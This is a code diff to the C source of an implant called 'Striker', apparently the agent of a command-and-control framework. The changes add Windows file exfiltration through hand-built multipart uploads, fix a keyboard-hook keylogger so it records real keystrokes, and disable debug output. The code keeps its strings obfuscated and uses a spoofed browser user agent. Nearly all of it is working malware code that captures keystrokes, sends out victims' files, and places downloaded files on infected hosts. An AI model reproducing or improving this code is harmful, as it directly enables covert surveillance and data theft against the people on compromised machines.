@@ -14,7 +14,7 @@
 // #define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
-#define STRIKER_DEBUG
+// #define STRIKER_DEBUG
 
 // Size of agent UID
 #define AGENT_UID_SIZE 17
@@ -32,9 +32,14 @@
 #define KEYMON_PROC_DELAY 1
 // Max URL length allowed
 #define URL_SIZE (sizeof(char) * 512)
-// Max length for URL hostname, and path.
-#define MAX_URL_HOST_LEN 100
-#define MAX_URL_PATH_LEN 256
+// Max length for URL hostname, and path. Used for parsing.
+#define MAX_URL_HOST_LEN 256
+#define MAX_URL_PATH_LEN 512
+
+#ifdef IS_WINDOWS
+  // Max file upload size
+  #define MAX_UPLOAD_SIZE (1024 * 100000)
+#endif
 
 // Markers for the agent builder.
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]";
@@ -43,7 +48,7 @@ char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
 char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";
 
 // Some globals for the keylogger.
-static char keymon_active = 0;
+short keymon_active = 0;
 #ifdef IS_WINDOWS
   static short *keymon_keystrokes = NULL;
   static size_t keymon_keystrokes_count = 0;
@@ -62,6 +67,21 @@ char *obfs_decode(char *str){
     key = curr_key;
   }
   return str;
+}
+
+char *random_str(size_t len){
+
+  char *buff = malloc(len + 1);
+  if (!buff)
+    return NULL;
+  srand(time(NULL));
+  char table[] = "[OBFS_ENC]ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  obfs_decode(table);
+  int table_len = strlen(table);
+  for (int i = 0; i < len; i++)
+    buff[i] = table[rand() % table_len];
+  buff[len] = '\0';
+  return buff;
 }
 
 void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
@@ -103,6 +123,35 @@ void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
   host[host_len] = '\0';
 }
 
+char *get_basename(char *path){
+  
+  int pos = -1;
+  int path_len = strlen(path);
+  for (int i = path_len - 1; i >= 0; i--){
+    #ifdef IS_WINDOWS
+      if (path[i] == '\\' || path[i] == '/'){
+        pos = i;
+        break;
+      }
+    #else
+      if (path[i] == '/'){
+        pos = i;
+        break;
+      }
+    #endif
+  }
+  char *basename = NULL;
+  if (pos == -1){ // Return the path as it was given
+    basename = malloc(path_len + 1);
+    strncpy(basename, path, path_len + 1);
+  }else{ // Extract the basename.
+    int basename_len = path_len - pos;
+    basename = malloc(basename_len + 1);
+    strncpy(basename, path + pos + 1, basename_len + 1);
+  }
+  return basename;
+}
+
 int http_get(char *url, buffer *body){
 
   char *target_url;
@@ -136,21 +185,19 @@ int http_get(char *url, buffer *body){
     int rsp_code;
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
     curl_easy_cleanup(curl);
-    free(target_url);
     if (res != CURLE_OK){
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[-] Error making GET request to: %s: %s\n", target_url, curl_easy_strerror(res));
       #endif
-      return 0;
+      rsp_code = 0;
     }
+    free(target_url);
     return rsp_code;
   #else
     char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
-    int urlLen = strlen(target_url);
-    wchar_t wcUrl[urlLen+1];
-    mbstowcs(wcUrl, target_url, urlLen + 1);
-    HINTERNET hInternet = InternetOpen(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlW(hInternet, wcUrl, L"", 0, 0, 0);
+    HINTERNET hInternet = InternetOpenA(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    free(target_url);
     if (!hResponse){
       InternetCloseHandle(hInternet);
       return 0;
@@ -216,13 +263,13 @@ int http_post(char *url, cJSON *data, buffer *body){
     curl_easy_cleanup(curl);
     free(post_body);
     curl_slist_free_all(post_headers);
-    free(target_url);
     if (res != CURLE_OK){
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[-] Error making POST request to: %s: %s\n", target_url, curl_easy_strerror(res));
       #endif
-      return 0;
+      rsp_code = 0;
     }
+    free(target_url);
     return rsp_code;
   #else
     DWORD dwStatusCode = 0;
@@ -234,7 +281,7 @@ int http_post(char *url, cJSON *data, buffer *body){
     char *postData = cJSON_PrintUnformatted(data);
     HINTERNET hInternet = InternetOpenA(strs[1], INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[2], urlPath, NULL, NULL, NULL, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[2], urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[-] Error making POST request to: %s\n", target_url);
@@ -315,9 +362,19 @@ cJSON *sysinfo(){
 
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){
 
-  char strs[][20] = {"[OBFS_ENC]file", "[OBFS_ENC]filename"};
-  for (int i = 0; i < 2; i++)
+  char strs[][40] = {"[OBFS_ENC]Error getting file size!", "[OBFS_ENC]File is empty!", "[OBFS_ENC]File too large!", "[OBFS_ENC]file", "[OBFS_ENC]filename"};
+  for (int i = 0; i < 5; i++)
     obfs_decode(strs[i]);
+  struct stat st;
+  if (stat(filename, &st)){
+    buffer_strcpy(result_buff, strs[0]);
+    return 1;
+  }
+  size_t file_size = st.st_size;
+  if (!file_size){
+    buffer_strcpy(result_buff, strs[1]);
+    return 1;
+  }
   #ifdef IS_LINUX
     buffer *body = create_buffer(0);
     CURL *curl = curl_easy_init();
@@ -333,10 +390,10 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     curl_mimepart *field;
     form = curl_mime_init(curl);
     field = curl_mime_addpart(form);
-    curl_mime_name(field, strs[0]);
+    curl_mime_name(field, strs[3]);
     curl_mime_filedata(field, filename);
     field = curl_mime_addpart(form);
-    curl_mime_name(field, strs[1]);
+    curl_mime_name(field, strs[4]);
     curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
     res = curl_easy_perform(curl);
@@ -345,12 +402,72 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
       buffer_strcpy(result_buff, curl_easy_strerror(res));
-      return 0;
+      return 1;
     }
-    return 1;
+    char msg[] = "[OBFS_ENC]File downloaded successfully!";
+    buffer_strcpy(result_buff, obfs_decode(msg));
+    return 0;
   #else
-    buffer_strcpy(result_buff, "Coming soon on windows...");
-    return 1;
+    if (file_size > MAX_UPLOAD_SIZE){
+      buffer_strcpy(result_buff, strs[2]);
+      return 1;
+    }
+    char form_strs[][76] = {"[OBFS_ENC]----WebKitFormBoundary", "[OBFS_ENC]Content-Type: multipart/form-data; boundary=", "[OBFS_ENC]\r\nContent-Length: ", "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)", "[OBFS_ENC]\r\nContent-Disposition: form-data; name=\"file\"; filename=\"", "[OBFS_ENC]\"\r\nContent-Type: application/octet-stream\r\n\r\n"};
+    for (int i = 0; i < 6; i++)
+      obfs_decode(form_strs[i]);
+    char *token = random_str(16);
+    char *boundary = malloc(50);
+    strncpy(boundary, form_strs[0], 50);
+    strncat(boundary, token, 50 - strlen(boundary));
+    char *headers = malloc(1024);
+    strncpy(headers, form_strs[1], 1024);
+    strncat(headers, boundary, 1024 - strlen(headers));
+    strncat(headers, form_strs[2], 1024 - strlen(headers));
+
+    URL_PROTO proto;
+    char *urlHost = malloc(MAX_URL_HOST_LEN);
+    int urlPort = 0;
+    char *urlPath = malloc(MAX_URL_PATH_LEN);
+    parse_url(url, &proto, urlHost, &urlPort, urlPath);
+    HINTERNET hInternet = InternetOpenA(form_strs[3], INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+
+    char *formDataPrefix = malloc(1024);
+    strncpy(formDataPrefix, "--", 1024);
+    strncat(formDataPrefix, boundary, 1024 - strlen(formDataPrefix));
+    strncat(formDataPrefix, form_strs[4], 1024 - strlen(formDataPrefix));
+    char *basename = get_basename(filename);
+    strncat(formDataPrefix, basename, 1024 - strlen(formDataPrefix));
+    strncat(formDataPrefix, form_strs[5], 1024 - strlen(formDataPrefix));
+
+    char *formDataSuffix = malloc(100);
+    strncpy(formDataSuffix, "\r\n--", 100);
+    strncat(formDataSuffix, boundary, 100 - strlen(formDataSuffix));
+    strncat(formDataSuffix, "--\r\n", 100 - strlen(formDataSuffix));
+
+    size_t bodySize = strlen(formDataPrefix) + file_size + strlen(formDataSuffix);
+    char *bodySizeStr = malloc(32);
+    snprintf(bodySizeStr, 32, "%ld", (unsigned long)bodySize);
+    strncat(headers, bodySizeStr, 1024 - strlen(headers));
+
+    char *requestBody = malloc(bodySize);
+    memcpy(requestBody, formDataPrefix, strlen(formDataPrefix));
+    fread(requestBody + strlen(formDataPrefix), 1, file_size, rfo);
+    memcpy(requestBody + strlen(formDataPrefix) + file_size, formDataSuffix, strlen(formDataSuffix));
+
+    int res = 0;
+    if (!HttpSendRequest(hRequest, headers, strlen(headers), requestBody, bodySize))
+      res = 1;
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    free(urlHost); free(urlPath); free(token); free(basename);
+    free(boundary); free(headers); free(formDataPrefix);
+    free(formDataSuffix); free(bodySizeStr); free(requestBody);
+    char msg[] = "[OBFS_ENC]File downloaded successfully!";
+    buffer_strcpy(result_buff, obfs_decode(msg));
+    return res;
   #endif
 }
 
@@ -371,24 +488,16 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
       buffer_strcpy(result_buff, curl_easy_strerror(res));
-      return 0;
+      return 1;
     }
-    char msg[] = "[OBFS_ENC]File uploaded successfully!";
-    buffer_strcpy(result_buff, obfs_decode(msg));
   #else
     char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
-    int urlLen = strlen(url);
-    wchar_t wcUrl[urlLen+1];
-    mbstowcs(wcUrl, url, urlLen + 1);
-    HINTERNET hInternet = InternetOpen(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlW(hInternet, wcUrl, L"", 0, 0, 0);
+    HINTERNET hInternet = InternetOpenA(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!hResponse){
       InternetCloseHandle(hInternet);
-      return 0;
+      return 1;
     }
-    DWORD dwStatusCode;
-    DWORD dwHeaderSize = sizeof(DWORD);
-    HttpQueryInfo(hResponse, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
     DWORD dwBlockSize = 1024;
     DWORD dwBytesRead;
     char *buff = malloc(dwBlockSize);
@@ -400,9 +509,10 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
     free(buff);
     InternetCloseHandle(hResponse);
     InternetCloseHandle(hInternet);
-    return dwStatusCode;
   #endif
-  return 1;
+  char msg[] = "[OBFS_ENC]File uploaded successfully!";
+  buffer_strcpy(result_buff, obfs_decode(msg));
+  return 0;
 }
 
 void keymon(session *striker, task *tsk){
@@ -513,7 +623,7 @@ void keymon(session *striker, task *tsk){
       if (keymon_keystrokes_count > 0){      
         cJSON *keysArray = cJSON_CreateArray();
         for (int i = 0; i < keymon_keystrokes_count; i++)
-          cJSON_AddItemToArray(keysArray, cJSON_CreateNumber(keymon_keystrokes[i]));
+          cJSON_AddItemToArray(keysArray, cJSON_CreateNumber(*(keymon_keystrokes + (sizeof(short) * i))));
         cJSON_AddItemToObject(tsk->result, strs[5], keysArray);
       }else{
         cJSON_AddItemToObject(tsk->result, strs[3], cJSON_CreateString(strs[4]));
@@ -693,7 +803,7 @@ void keymon(session *striker, task *tsk){
       result = result ^ 0x4000;
     if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES){    
       printf("Caps: %d   Shift: %d   Val: %c\n", (result & 0x8000) != 0, (result & 0x4000) != 0, result & 0xff);
-      *(keymon_keystrokes + (sizeof(short) * keymon_keystrokes_count)) = 0;
+      *(keymon_keystrokes + (sizeof(short) * keymon_keystrokes_count)) = result;
       keymon_keystrokes_count += 1;
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -1058,7 +1168,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
     char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
-    FILE *rfo = fopen(filename, "r");
+    FILE *rfo = fopen(filename, "rb");
     if (!rfo){
       buffer_strcpy(result_buff, strs[1]);
       goto complete;
@@ -1066,10 +1176,10 @@ DWORD WINAPI task_executor(LPVOID ptr)
     char *url = malloc(URL_SIZE);
     if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid) < 0)
       abort();
-    upload_file(url, filename, rfo, result_buff);
+    if (!upload_file(url, filename, rfo, result_buff))
+      tsk->successful = 1;
     fclose(rfo);
     free(url);
-    tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
     char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: "};
     for (int i = 0; i < 5; i++)
@@ -1079,11 +1189,11 @@ DWORD WINAPI task_executor(LPVOID ptr)
     char *url = malloc(URL_SIZE);
     if (snprintf(url, URL_SIZE, strs[2], BASE_URL, fileID) < 0)
       abort();
-    FILE *wfo = fopen(name, "w");
+    FILE *wfo = fopen(name, "wb");
     if (wfo != NULL){
-      download_file(url, wfo, result_buff);
+      if (!download_file(url, wfo, result_buff))
+        tsk->successful = 1;
       fclose(wfo);
-      tsk->successful = 1;
     }else{
       append_buffer(result_buff, strs[4], strlen(strs[4]));
       append_buffer(result_buff, name, strlen(name));
@@ -1216,7 +1326,6 @@ void start_session(){
   strncpy(striker->write_dir, publicDir, strlen(publicDir) + 2);
   striker->write_dir[strlen(publicDir)] = '\\';
   striker->write_dir[strlen(publicDir) + 1] = '\0';
-  free(publicDir);
   #endif
   striker->abort = 0;
   char *tmp;
